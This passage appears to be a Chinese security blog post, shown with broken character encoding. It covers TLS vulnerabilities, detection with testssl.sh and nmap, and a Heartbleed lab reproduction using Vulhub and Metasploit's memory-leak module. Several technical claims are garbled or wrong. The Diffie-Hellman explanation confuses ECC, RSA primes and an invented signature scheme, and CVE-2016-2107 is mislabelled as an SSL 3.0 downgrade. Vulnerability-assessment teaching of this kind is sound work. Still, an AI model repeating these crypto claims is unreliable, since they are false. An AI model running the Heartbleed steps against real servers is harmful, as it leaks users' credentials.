å¯†æ•°æ®ï¼Œï¼ˆæ½œåœ¨ï¼‰æ‰§è¡Œä¼šè¯åŠ«æŒã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æŸ¥å¯†æ–‡çš„å¤§å°æ¥è¯†åˆ«åŠ å¯†æ•°æ®ï¼ŒåŒæ—¶ä»æµè§ˆå™¨å¼•å…¥å¤šä¸ªæœ‰æ•ˆè½½è·ï¼Œå½“å­—ç¬¦åŒ¹é…åœ¨æ ‡é¢˜å†…æ—¶ï¼Œå…¶å¤§å°ä¼šæœ‰æ‰€ä¸åŒï¼Œå…è®¸æ”»å‡»è€…ä¿®æ”¹ä¼šè¯ cookieã€‚å®é™…ä¸Šæ²¡æœ‰ä½¿ç”¨ CRIME æ”»å‡»è§£å¯†æ•°æ®ï¼ŒTLS 1.2 å¤„ç†å‹ç¼©çš„ä¸€ä¸ªå¼±ç‚¹ä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ¯”è¾ƒè¿”å›çš„å¤§å°æ¥è¯†åˆ«å¤´æ–‡ä»¶ä½•æ—¶å­˜åœ¨ã€‚ æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl.sh -C TARGET # ä½¿ç”¨ openssl clientï¼Œkali ä½¿ç”¨çš„ openssl ä¼¼ä¹ä¸å†å…è®¸ TLS 1.2 å‹ç¼©ã€‚å¦‚æœæ‚¨ä½¿ç”¨æ­¤ç‰ˆæœ¬çš„ openssl è¿›è¡Œæµ‹è¯•ï¼Œå³ä½¿ç›®æ ‡æœåŠ¡å™¨å¯ç”¨äº† TLS 1.2 å‹ç¼©ï¼Œå“åº”å°†å§‹ç»ˆä¸º â€œCompressionï¼šNONEâ€ã€‚å¯ä»¥ä½¿ç”¨ testssl.sh é™„å¸¦çš„ openssl.Linux.x86_64 äºŒè¿›åˆ¶æ–‡ä»¶æ¥è§£å†³æ­¤é—®é¢˜ã€‚ ./bin/openssl.Linux.x86_64 s_client -connect 10.0.1.158:443 # ç¤ºä¾‹è¾“å‡º â€“ ä¸æ˜“å— CRIME å½±å“ å¦‚æœæœåŠ¡å™¨ä¸å®¹æ˜“å—åˆ° CRIME çš„å½±å“ã€‚â€œå‹ç¼©ï¼šæ— â€è¡¨ç¤ºå‹ç¼©åœ¨æœåŠ¡å™¨ä¸Šè¢«ç¦ç”¨ï¼Œå¹¶ä¸”ä¸æ˜“å—åˆ° CRIME çš„æ”»å‡»ã€‚ Compression: NONE # ç¤ºä¾‹è¾“å‡º â€“ æ˜“å— CRIME å½±å“ å¦‚æœæœåŠ¡å™¨æ˜“å— CRIME æ”»å‡»ï¼š Compression: zlib compression ä¿®å¤æ–¹æ³• SSL å‹ç¼©åœ¨ä¸‹è¿°ç‰ˆæœ¬æ˜¯é»˜è®¤å…³é—­çš„ï¼š nginx 1.1.6 åŠæ›´é«˜/1.0.9 åŠæ›´é«˜ï¼ˆå¦‚æœä½¿ç”¨äº† OpenSSL 1.0.0 åŠæ›´é«˜ï¼‰ï¼Œ nginx 1.3.2 åŠæ›´é«˜/1.2.2 åŠæ›´é«˜ï¼ˆå¦‚æœä½¿ç”¨è¾ƒæ—§ç‰ˆæœ¬çš„ OpenSSLï¼‰ã€‚ CVE-2016-2107 - SSL 3.0 é™çº§åŠ å¯†åè®® Openssl Padding Oracle æ¼æ´ æ¼æ´æè¿° å½“æµè§ˆå™¨è¿›è¡Œ HTTPS è¿æ¥å¤±è´¥çš„æ—¶å€™ï¼Œå°†ä¼šå°è¯•ä½¿ç”¨æ—§çš„åè®®ç‰ˆæœ¬ï¼Œè¿™å…¶ä¸­å°±åŒ…æ‹¬ SSL 3.0ï¼Œäºæ˜¯åŠ å¯†åè®®ç”±æ›´åŠ å®‰å…¨çš„åè®®ï¼ˆæ¯”å¦‚ï¼šTLS 1.0ï¼‰é™çº§æˆ SSL 3.0ã€‚ç„¶ååˆ©ç”¨ SSLv3 ä¸­å­˜åœ¨çš„æ¼æ´ï¼Œè§£å¯†å¾—åˆ°å…¶æ•°æ®åŒ…çš„æ˜æ–‡ä¿¡æ¯ï¼Œè€Œè¿™äº›æ˜æ–‡ä¿¡æ¯ææœ‰å¯èƒ½æ˜¯ç”¨æˆ·çš„éšç§æ•°æ®ï¼Œæ¯”å¦‚ cookieï¼Œè¿™æ ·æ”»å‡»è€…å°±å¯ä»¥æ‹¿åˆ°è¿™äº›éšç§æ•°æ®ï¼Œè¿›è¡Œæ›´æ·±å±‚æ¬¡çš„æ”»å‡»ã€‚ OpenSSL CVE-2016-2107 æ¼æ´åˆ†æ å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´ ( 1.0.1â€”1.0.1f / 1.0.2 Beta1â€‹â€‹ ) æµ‹è¯•æ–¹æ³• åœ¨çº¿æµ‹è¯• CVE-2016-2107 testï¼ˆä¸“é¡¹æµ‹è¯•ï¼‰ SSL Server Testï¼ˆå›½å†…ï¼‰ SSL Server Testï¼ˆå›½å¤–ï¼‰ æœ¬åœ°æµ‹è¯• git clone https://github.com/FiloSottile/CVE-2016-2107 # ç„¶åè¿›å…¥ CVE-2016-2107 æ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œå‘½ä»¤ go run main.go jdddd.com ======== $ go version go version go1.6.2 darwin/amd64 $ go get github.com/FiloSottile/CVE-2016-2107 $ CVE-2016-2107 filippo.io 2016/05/03 17:50:49 Vulnerable: false ä¿®å¤æ–¹æ³• ç¡®è®¤ 443 ç«¯å£è¢«å“ªä¸ªæœåŠ¡è°ƒç”¨ï¼Œç„¶åæ›´æ–°è¯¥ç¨‹åºæ‰€ä¾èµ–çš„ OpenSSLï¼ˆä¸ä¸€å®šæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„ OpenSSLï¼‰ã€‚ æ¨èæŠŠ OpenSSL ç‰ˆæœ¬æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ OpenSSL 1.0.2 åº”å‡çº§åˆ° 1.0.2h æˆ–ä»¥ä¸Š OpenSSL 1.0.1 åº”å‡çº§åˆ° 1.0.1t æˆ–ä»¥ä¸Š OpenSSL 1.0.0 åº”å‡çº§åˆ° 1.0.1t æˆ–ä»¥ä¸Š æ›´æ–°å®Œæ¯•åï¼Œè¯·é‡å¯è°ƒç”¨ 443 ç«¯å£çš„æœåŠ¡ã€‚ SSL/TSL ç¬æ—¶ Diffie-Hellman å…¬å…±å¯†é’¥è¿‡å¼±ã€åŸç†æ‰«æã€‘ æ¼æ´æè¿° Diffie-Hellman åè®®ç”¨äºç”Ÿæˆå…¬å…±å¯†é’¥å¯¹ï¼Œä»¥ç¡®ä¿é€šä¿¡åŒæ–¹äº¤æ¢çš„å¯†é’¥æ˜¯å®‰å…¨çš„ã€‚å…¶åŸç†æ˜¯ï¼šåœ¨ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´äº¤æ¢ä¸€äº›éšæœºæ•°ï¼Œç„¶åä½¿ç”¨è¿™äº›éšæœºæ•°è®¡ç®—å‡ºä¸€ä¸ªå›ºå®šçš„æ¤­åœ†æ›²çº¿å‚æ•°ï¼ˆECCï¼‰ï¼Œæ¥ç€ç”Ÿæˆä¸¤ä¸ªå¤§è´¨æ•° p å’Œ qï¼Œå®ƒä»¬å°†æˆä¸º Diffie-Hellman å¯†é’¥äº¤æ¢çš„åŸºç¡€ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œç”±äºè®¡ç®— ECC çš„è¿‡ç¨‹ä¸­å¯èƒ½å­˜åœ¨è¯¯å·®ï¼Œå¯¼è‡´ç”Ÿæˆçš„å¯†é’¥å¯èƒ½å­˜åœ¨ä¸€å®šç¨‹åº¦çš„å¼±ç‚¹ã€‚ æµ‹è¯•æ–¹æ³• nmap -sV -Pn --script ssl-dh-params ç«¯å£ IP ä¿®å¤æ–¹æ³• ç†è®º å¢åŠ å¯†é’¥é•¿åº¦ï¼šä¸ºäº†æé«˜å¯†é’¥çš„å®‰å…¨æ€§ï¼Œå¯ä»¥å¢åŠ å¯†é’¥é•¿åº¦ã€‚å…·ä½“å®ç°æ–¹æ³•å¦‚ä¸‹ï¼šä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯å°†åŸå§‹æ¤­åœ†æ›²çº¿å‚æ•°æ‰©å±•ä¸º n ä¸ªç‚¹ï¼Œæ¯ä¸ªç‚¹çš„ç¦»æ•£è·ç¦»ä¸º r=h/(2^n)ï¼Œå…¶ä¸­ h ä¸ºå¤§ç´ æ•°ã€‚å¦ä¸€ç§æ›´å¤æ‚çš„æ–¹æ³•æ˜¯ä½¿ç”¨ RSA åŠ å¯†ç®—æ³•ä¸­çš„å¤§è´¨æ•°åˆ†è§£æŠ€æœ¯ç”Ÿæˆä¸¤ä¸ªå¤§è´¨æ•° p å’Œ qã€‚è¿™äº›å¤§è´¨æ•°å°†æˆä¸º Diffie-Hellman å¯†é’¥äº¤æ¢çš„åŸºç¡€ã€‚ é€‰æ‹©æ›´å¥½çš„è¯ä¹¦ï¼šä¸ºäº†é¿å…è¯ä¹¦è¢«ä¼ªé€ æˆ–ç¯¡æ”¹ï¼Œå¯ä»¥é€‰æ‹©æ›´å¥½çš„è¯ä¹¦ã€‚ ä½¿ç”¨ Diffie-Hellman ç­¾åï¼šä¸ºäº†ä¿è¯é€šä¿¡åŒæ–¹äº¤æ¢çš„å¯†é’¥æ˜¯å®‰å…¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ Diffie-Hellman ç­¾åæ¥éªŒè¯å¯†é’¥äº¤æ¢è¿‡ç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¯¯å·®ã€‚å…·ä½“å®ç°æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆè®¡ç®—å‡ºæ¯ä¸ªèŠ‚ç‚¹ç”Ÿæˆçš„éšæœºæ•° a å’Œ bï¼Œå¹¶ä½¿ç”¨å…¬é’¥å¯¹å®ƒä»¬è¿›è¡ŒåŠ å¯†ç”Ÿæˆå…¬é’¥ï¼ˆe å’Œ dï¼‰ã€‚æ¥ç€è®¡ç®—å‡ºç§é’¥ï¼ˆd å’Œ cï¼‰å¹¶è¿›è¡Œç­¾åï¼Œå³ e å’Œ dã€‚é€šä¿¡åŒæ–¹å°†è¿™ä¸¤ä¸ªç­¾åä¸å‘é€æ–¹äº¤æ¢çš„ç§é’¥å¯¹æ¯”ï¼Œå¦‚æœç›¸åŒåˆ™è®¤ä¸ºæ— è¯¯å·®å‘ç”Ÿï¼›å¦‚æœä¸ç›¸åŒï¼Œåˆ™å­˜åœ¨è¯¯å·®å­˜åœ¨éœ€è¦è¿›è¡Œé‡ä¼ ã€‚ å®è·µ https://weakdh.org/sysadmin.html Nginx é…ç½® # 1. ç”Ÿæˆ dhparams.pem cd /usr/local/nginx/conf openssl dhparam -out dhparams.pem 2048 chmod -R 755 dhparams.pem # ç¼–è¾‘ nging.conf æ–‡ä»¶ï¼Œæ·»åŠ  ssl_dhparam {path to dhparams.pem}; ssl_dhparam /usr/local/nginx/conf/dhparams.pem; # é‡å¯ nginx sudo nginx -s reload CVE-2014-0224 - CCS æ³¨å…¥æ¼æ´ æ¼æ´æè¿° æŸäº›ç‰ˆæœ¬çš„ OpenSSL å­˜åœ¨å¼±ç‚¹ï¼Œå…è®¸å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡ç‰¹åˆ¶çš„æ¡æ‰‹åŒ…æ¥å¼ºåˆ¶ä½¿ç”¨å¼±å¯†é’¥è¿›è¡Œé€šä¿¡ã€‚ åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ¡æ‰‹é˜¶æ®µï¼ŒOpenSSL åè®®ä¸åˆæ—¶å®œåœ°æ¥å—å¯†ç æ›´æ¢è¯´æ˜(ChangeCipherSpec :CCSâ€‹â€‹)ï¼Œè€Œäº§ç”Ÿäº†è¯¥æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥å‘èµ·ä¸­é—´äººæ”»å‡»å¹¶åˆ©ç”¨æ­¤æ¼æ´ç¯¡æ”¹æˆ–ç›‘å¬ SSL åŠ å¯†ä¼ è¾“çš„æ•°æ®ã€‚ä¸å—å½±å“çš„ OpenSSL ç‰ˆæœ¬ï¼š OpenSSL before 0.9.8za OpenSSL 1.0.0 before 1.0.0m OpenSSL 1.0.1 before 1.0.1 å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬ï¼š OpenSSL 1.0.1 through 1.0.1g OpenSSL 1.0.0 through 1.0.0l all versions before OpenSSL 0.9.8y èµ„æ–™æ¥æº https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0224 https://www.openssl.org/news/secadv/20140605.txt æµ‹è¯•æ–¹æ³• # testssl.sh ./testssl.sh -I TARGET # nmap nmap -p 443 --script = ssl-ccs-injection TARGET nmap -sV -Pn --script ssl-ccs-injection ç«¯å£ IP ä¿®å¤æ–¹æ³• ä½¿ç”¨ ldd nginxâ€‹â€‹ æŒ‡ä»¤æ£€æŸ¥æ˜¯å¦æœ‰çš„ libssl.soâ€‹â€‹ å’Œ libcrypto.soâ€‹â€‹ çš„è°ƒç”¨ï¼Œå¦‚æœç”¨ï¼Œç›´æ¥å‡çº§ openssl å°±å¯ä»¥äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆéœ€è¦é‡æ–°ç¼–è¯‘ Nginxã€‚ https://cloud.baidu.com/doc/CAS/s/Gkhlqq92f CVE-2009-3555 - Renegotiation æ¼æ´æè¿° 2009 å¹´å‘ç°ä¸€ä¸ªåˆ©ç”¨ TLS å’Œ SSL åè®® Renegotiation çš„æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å°†æ•°æ®æ’å…¥ä¼šè¯å¯å±åŠå…¶å®Œæ•´æ€§ã€‚ å¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰èƒ½åˆ©ç”¨æ­¤æ¼æ´ æœåŠ¡å™¨ä¸æ”¯æŒ secure renegotiationâ€‹â€‹ æœåŠ¡å™¨å¿…é¡»å…è®¸ client side renegotiationâ€‹â€‹ æµ‹è¯•æ–¹æ³• â”Œâ”€â”€(rootã‰¿kali)-[/home/testssl.sh] â””â”€# ./testssl.sh -R 192.168.201.216:9443 ########################################################### testssl.sh 3.2rc2 from https://testssl.sh/dev/ (f716193 2023-05-16 10:44:56) This program is free software. Distribution and modification under GPLv2 permitted. USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK! Please file bugs @ https://testssl.sh/bugs/ ########################################################### Using \"OpenSSL 1.0.2-bad (1.0.2k-dev)\" [~183 ciphers] on kali:./bin/openssl.Linux.x86_64 (built: \"Sep 1 14:03:44 2022\", platform: \"linux-x86_64\") Start 2023-05-23 05:38:17 -->> 192.168.201.216:9443 (192.168.201.216) > 192.168.201.216:9443 (192.168.201.216) ä½¿ç”¨ openssl client æµ‹è¯• openssl s_client -connect TARGET:443 Secure Renegotiation å¯ç”¨ æµ‹è¯• Client Initiated Secure Renegotiationâ€‹â€‹ openssl s_client -connect TARGETï¼š443 ç±»å‹ï¼š HEAD / HTTP / 1.1 R å¦‚æœä½ çœ‹åˆ°å“åº”ï¼š HEAD / HTTP / 1.1 R RENEGOTIATING å³æœåŠ¡å™¨å…è®¸ client renegotiationâ€‹â€‹ã€‚ å¦‚æœä½ çœ‹åˆ°å›åº”ï¼š HEAD / HTTP/1.1 R RENEGOTIATING 139681067286040:error:1409E0E5:SSL routines:ssl3_write_bytes:ssl handshake failure:s3_pkt.c:656: åˆ™æœåŠ¡å™¨ä¸æ”¯æŒ client renegotiationâ€‹â€‹ã€‚ ä¿®å¤æ–¹æ³• å»ºè®®å‡çº§ openssl æ¥è¿›è¡Œä¿®å¤ï¼Œopenssl-0.98m ä¹‹åçš„ç‰ˆæœ¬å°±å·²ç»ä¿®å¤äº†è¯¥æ¼æ´ï¼Œä½¿ç”¨äº† Secure Renegotiationã€‚ å…¶ä»– # éªŒè¯ ssl-cert è¯ä¹¦é—®é¢˜å¯ä»¥ä½¿ç”¨ nmap -sV -Pn --script ssl-cert ç«¯å£ IP # éªŒè¯ SSL è¯ä¹¦çš„æœ‰é™æœŸå¯ä»¥ä½¿ç”¨ nmap -sV -Pn --script ssl-date ç«¯å£ IP # éªŒè¯ Debian OpenSSL keys å¯ä½¿ç”¨ nmap -sV -Pn --script ssl-known-key ç«¯å£ IP # éªŒè¯ CVE-2014-0160 OpenSSL Heartbleed bug å¯ä½¿ç”¨ nmap -sV -Pn --script ssl-heartbleed ç«¯å£ IP ======== # æµ‹è¯•å•ä¸ªä¸»æœºä¸Šçš„æ‰€æœ‰å†…å®¹å¹¶è¾“å‡ºåˆ°æ§åˆ¶å° ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST # æµ‹è¯•å•ä¸ªä¸»æœºä¸Šçš„æ‰€æœ‰å†…å®¹å¹¶è¾“å‡ºåˆ° HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha> OUTPUT-FILE.html # æµ‹è¯•å­ç½‘ä¸Šçš„æ‰€æœ‰ä¸»æœºå¹¶è¾“å‡ºåˆ° HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 | aha> OUTPUT-FILE.html # ä¸ä¸Šè¿°ç›¸åŒï¼Œä½†åªåˆ—ä¸¾æ¯ä¸ªæœåŠ¡å™¨æ”¯æŒçš„å¯†ç ç±»å‹ ./testssl.sh -E 192.168.1.0/24 | aha> OUTPUT-FILE.html 0x02 æ£€æµ‹æ–¹æ³• ä½¿ç”¨ NMAP æ£€æµ‹ Window éœ€è¦ä¸‹è½½å®‰è£… nmapï¼Œå®˜ç½‘åœ°å€ï¼šhttps://nmap.org/download.html kali å¯ç›´æ¥ä½¿ç”¨ nmap -sV --script ssl-enum-ciphers ç«¯å£ IP â”Œâ”€â”€(rootã‰¿kali)-[/home/testssl.sh] â””â”€# nmap -sV --script ssl-enum-ciphers 9443 192.168.201.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 03:19 EDT ä½¿ç”¨ testssl.sh å·¥å…· testssl.sh å¯ä»¥å¯¹ TLS/SSL Serverâ€‹â€‹ ç«¯ Cipherã€Protocol è¿›è¡Œæ£€æµ‹ï¼Œè¿˜å¯ä»¥è¿›è¡Œ CCS æ³¨å…¥ï¼ˆCCS injectionï¼‰ã€Heartbleed ç­‰å®‰å…¨æ¼æ´æµ‹è¯•ï¼ŒåŠŸèƒ½å…¨é¢ä¸°å¯Œï¼Œå¯è¿è¡Œåœ¨ Linux/BSDâ€‹â€‹ ç«¯ï¼Œç›®å‰å¯ä»¥è¯´æ˜¯ TLS Server ç«¯é¦–é€‰çš„æµ‹è¯•å·¥å…·ã€‚ã€‚ å®˜ç½‘ï¼šhttps://testssl.sh/ GitHubï¼šhttps://github.com/drwetter/testssl.sh git clone --depth 1 https://github.com/drwetter/testssl.sh.git â”Œâ”€â”€(rootã‰¿kali)-[/home] â””â”€# cd testssl.sh â”Œâ”€â”€(rootã‰¿kali)-[/home/testssl.sh] â””â”€# ./testssl.sh -U 172.16.10.160 # æµ‹è¯•å­ç½‘ä¸Šçš„æ‰€æœ‰ä¸»æœºå¹¶è¾“å‡ºåˆ° HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 | aha> OUTPUT-FILE.html å…¶ä¸­å¸¸ç”¨çš„æœ‰ â€‹-Eâ€‹â€‹â€‹â€‹, --cipher-per-proto checks those per protocol, æ£€æµ‹å„ Protocol ciphersuites åŠ å¯†ç®—æ³•å¥—ä»¶ â€‹-Pâ€‹â€‹â€‹â€‹, --server-preference displays the serverâ€™s picks: protocol+cipherï¼ŒServer çš„é¦–é€‰åè®® + å¯†ç  â€‹-Sâ€‹â€‹â€‹â€‹, --server-defaults displays the serverâ€™s default picks and certificate infoï¼ŒServer çš„é»˜è®¤é€‰æ‹©å’Œè¯ä¹¦ä¿¡æ¯ â€‹-Uâ€‹â€‹â€‹â€‹, --vulnerable tests all (of the following) vulnerabilities (if applicable)ï¼Œæ£€æµ‹æ‰€æœ‰æ¼æ´ â€‹-Jâ€‹â€‹â€‹â€‹, --logjam tests for LOGJAM vulnerabilityï¼Œæ£€æµ‹ CVE-2015-4000 â€‹-4â€‹â€‹â€‹â€‹, --rc4, --appelbaum which RC4 ciphers are being offeredï¼Œæ£€æµ‹ CVE-2013-2566 â€‹--ciphersâ€‹â€‹â€‹ å¼±å¯†ç è¯†åˆ« å…¶ä»–å¯ä»¥å‚çœ‹ --helpâ€‹â€‹ å‘½ä»¤ â”Œâ”€â”€(rootã‰¿kali)-[/home/testssl.sh] â””â”€# ./testssl.sh --help \"testssl.sh [options] \" or \"testssl.sh \" \"testssl.sh \", where is mostly standalone and one of: --help what you're looking at -b, --banner displays banner + version of testssl.sh -v, --version same as previous -V, --local [pattern] pretty print all local ciphers (of openssl only). If search pattern supplied: it is an an ignore case word pattern of cipher hexcode or any other string in its name, kx or bits \"testssl.sh [options] \", where is: host|host:port|URL|URL:port port 443 is default, URL can only contain HTTPS as a protocol and [options] is/are: -t, --starttls Does a run against a STARTTLS enabled service which is one of ftp, smtp, lmtp, pop3, imap, sieve, xmpp, xmpp-server, telnet, ldap, nntp, postgres, mysql --xmpphost For STARTTLS xmpp or xmpp-server checks it supplies the domainname (like SNI) --mx Tests MX records from high to low priority (STARTTLS, port 25) --file/-iL Mass testing option: Reads one testssl.sh command line per line from . Can be combined with --serial or --parallel. Implicitly turns on \"--warnings batch\". Text format 1: Comments via # allowed, EOF signals end of Text format 2: nmap output in greppable format (-oG), 1 port per line allowed --mode Mass testing to be done serial (default) or parallel (--parallel is shortcut for the latter) --warnings \"batch\" doesn't continue when a testing error is encountered, off continues and skips warnings --connect-timeout useful to avoid hangers. Max to wait for the TCP socket connect to return --openssl-timeout useful to avoid hangers. Max to wait before openssl connect will be terminated single check as (\"testssl.sh URI\" does everything except -E and -g): -e, --each-cipher checks each local cipher remotely -E, --cipher-per-proto checks those per protocol -s, --std, --categories tests standard cipher categories by strength -f, --fs, --nsa checks forward secrecy settings -p, --protocols checks TLS/SSL protocols (including SPDY/HTTP2) -g, --grease tests several server implementation bugs like GREASE and size limitations -S, --server-defaults displays the server's default picks and certificate info -P, --server-preference displays the server's picks: protocol+cipher -x, --single-cipher tests matched of ciphers (if not a number: word match) -c, --client-simulation test client simulations, see which client negotiates with cipher and protocol -h, --header, --headers tests HSTS, HPKP, server/app banner, security headers, cookie, reverse proxy, IPv4 address -U, --vulnerable tests all (of the following) vulnerabilities (if applicable) -H, --heartbleed tests for Heartbleed vulnerability -I, --ccs, --ccs-injection tests for CCS injection vulnerability -T, --ticketbleed tests for Ticketbleed vulnerability in BigIP loadbalancers --BB, --robot tests for Return of Bleichenbacher's Oracle Threat (ROBOT) vulnerability --SI, --starttls-injection tests for STARTTLS injection issues -R, --renegotiation tests for renegotiation vulnerabilities -C, --compression, --crime tests for CRIME vulnerability (TLS compression issue) -B, --breach tests for BREACH vulnerability (HTTP compression issue) -O, --poodle tests for POODLE (SSL) vulnerability -Z, --tls-fallback checks TLS_FALLBACK_SCSV mitigation -W, --sweet32 tests 64 bit block ciphers (3DES, RC2 and IDEA): SWEET32 vulnerability -A, --beast tests for BEAST vulnerability -L, --lucky13 tests for LUCKY13 -WS, --winshock tests for winshock vulnerability -F, --freak tests for FREAK vulnerability -J, --logjam tests for LOGJAM vulnerability -D, --drown tests for DROWN vulnerability -4, --rc4, --appelbaum which RC4 ciphers are being offered? -U ç»“æœå¦‚ä¸‹ï¼š Start 2023-05-23 03:00:30 -->> 192.168.201.216:443 (192.168.201.216) > 192.168.201.216:443 (192.168.201.216) Web ç½‘é¡µç‰ˆ testssl.shï¼ˆå…å®‰è£…ï¼‰ï¼šhttps://inspect.rapydblok.comã€ä¸æ¨èã€‘ ã€æ³¨ã€‘ï¼šç½‘é¡µç‰ˆä½¿ç”¨è¦æ³¨æ„éšç§ï¼Œè‡ªç”¨ Server æ¨èè¿˜æ˜¯ç”¨ cmd ç‰ˆæµ‹è¯•ã€‚ åœ¨çº¿æ£€æµ‹ SSL Server Testï¼ˆå›½å†…ï¼‰ SSL Server Testï¼ˆå›½å¤–ï¼‰ filippo.io - Vulnerability tests https://wosign.ssllabs.com/ 0x03 æ¼æ´å¤ç° Vulhub Vulhub - Docker-Compose file for vulnerability environment https://github.com/vulhub/vulhub Docker æ•™ç¨‹_w3cschool å¿ƒè„æ»´è¡€å¤ç° ç¯å¢ƒå‡†å¤‡ ä¸»æœº IP ç”¨é€” Ubuntu è™šæ‹Ÿæœº 192.168.201.156 åŸºäº Vulhub æ­å»º OpenSSLâ€œå¿ƒè„æ»´è¡€â€æ¼æ´ç¯å¢ƒ Kali Linux è™šæ‹Ÿæœº 192.168.202.61 ä½¿ç”¨ MSF æ¡†æ¶å¯¹å­˜åœ¨æ¼æ´çš„é¶æœºè¿›è¡Œæ”»å‡» æ‰‹åŠ¨æ­å»º https://www.openssl.org/source/old/1.0.1/source/old/1.0.1/index.html (openssl.org) å‡†å¤‡ä¸€å° kali å’Œä¸€å°è£…æœ‰ OpenSSL1.0.1 ç‰ˆæœ¬çš„è™šæ‹Ÿæœºã€æ¼æ´ç¯å¢ƒã€‘ ä¸‹è½½æœ‰æ¼æ´çš„ OpenSSL ç‰ˆæœ¬ ç¼–è¯‘å®‰è£… # å‡çº§æº apt-get upgrade sudo apt-get update # å®‰è£…ç¼–è¯‘ç¯å¢ƒ root@refl4:/home/openssl-1.0.1# sudo apt-get install build-essential # ç¼–è¯‘å®‰è£… cd /home # åœ¨ /usr/local/openssl ç›®å½•ä¸‹å®‰è£… OpenSSLï¼Œå¹¶è®¾ç½®é»˜è®¤çš„ OpenSSL ç›®å½•ä¸º /usr/local/openssl ./config --prefix=/usr/local/openssl --openssldir=/usr/local/openssl # ç¼–è¯‘å®‰è£… sudo make clean sudo make && make install # è®¾ç½®è½¯é“¾ ln -s # ln -s /path/to/directory /path/to/symlink # è¿™å°†åˆ›å»ºä¸€ä¸ªåä¸º /path/to/symlink çš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘ /path/to/directoryã€‚ Vulhub æ­å»º å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯ docker compose æ˜¯ Compose V2ï¼Œæ‰€ä»¥ä½¿ç”¨ docker composeâ€‹â€‹ã€‚ History of Compose | Docker Documentation root@refl4:/home# git clone https://github.com/vulhub/vulhub.git root@refl4:/home/vulhub/openssl/CVE-2014-0160# pwd /home/vulhub/openssl/CVE-2014-0160 root@refl4:/home/vulhub/openssl/CVE-2014-0160# ls 1.png 2.png docker-compose.yml README.md README.zh-cn.md ssltest.py www root@refl4:/home/vulhub/openssl/CVE-2014-0160# docker compose up -d [+] Running 8/8 âœ” nginx 7 layers [â£¿â£¿â£¿â£¿â£¿â£¿â£¿] 0B/0B Pulled 131.1s âœ” b281ebec60d2 Pull complete 113.1s âœ” 2700c1ade95c Pull complete 113.2s âœ” cd1f945398e5 Pull complete 113.8s âœ” 24291727d0f3 Pull complete 113.9s âœ” c661453e1eb5 Pull complete 113.9s âœ” f4f1857f7bb1 Pull complete 113.9s âœ” 951d0b01db0f Pull complete 113.9s [+] Running 2/2 âœ” Network cve-2014-0160_default Created 0.1s âœ” Container cve-2014-0160-nginx-1 Started 1.3s è®¿é—® http://192.168.201.156:8080/ https://192.168.201.156:8443/ Exploit ä½¿ç”¨ namp è¿›è¡Œæ¢æµ‹ â”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# nmap -sV -p 8443 -script ssl-heartbleed.nse 192.168.201.156 ä½¿ç”¨ testssl.shâ€‹â€‹ è¿›è¡Œæ¢æµ‹ ä½¿ç”¨ Metasploit éªŒè¯å·²å­˜åœ¨çš„ Heartbleedâ€‹â€‹ï¼Œä½¿ç”¨è¯¦ç»†è®¾ç½®å°†æ˜¾ç¤º Heartbleedâ€‹â€‹ æš´éœ²çš„å†…å­˜æ³„æ¼ã€‚ â”Œâ”€â”€(rootã‰¿kali)-[/home/testssl.sh] â””â”€# msfconsole msf6> search heartbleed msf6> use auxiliary/scanner/ssl/openssl_heartbleed # æŸ¥çœ‹éœ€è¦è®¾ç½®å‚æ•° msf6 auxiliary(scanner/ssl/openssl_heartbleed) > show options msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.201.156 RHOSTS => 192.168.201.156 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set RPORT 8443 RPORT => 8443 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run æ¯æ¬¡éƒ½å¯ä»¥è·å– 64 å­—èŠ‚â€‹â€‹ çš„ä¿¡æ¯ï¼Œå¦‚æœæœ‰äººæ­¤æ—¶åœ¨ç™»å½• Web åº”ç”¨ï¼Œè¿˜å¯ä»¥ç›´æ¥æŠ“åˆ°è´¦å·å¯†ç ç­‰ä¿¡æ¯ã€‚ æ¼æ´ç¯å¢ƒæœ¬æœºè‡ªæµ‹ â€‹root@refl4:/home/vulhub/openssl/CVE-2014-0160# python3 ssltest.py 192.168.201.156 -p 8443â€‹â€‹ ç¼–è¯‘ OpenSSL é‡åˆ°çš„é”™è¯¯ æŠ¥é”™ â€‹POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs]â€‹â€‹ cms.pod around line 457: Expected text after =item, not a number cms.pod around line 461: Expected text after =item, not a number cms.pod around line 465: Expected text after =item, not a number cms.pod around line 470: Expected text after =item, not a number cms.pod around line 474: Expected text after =item, not a number POD document had syntax errors at /usr/bin/pod2man line 69. make: *** [install_docs] Error 1 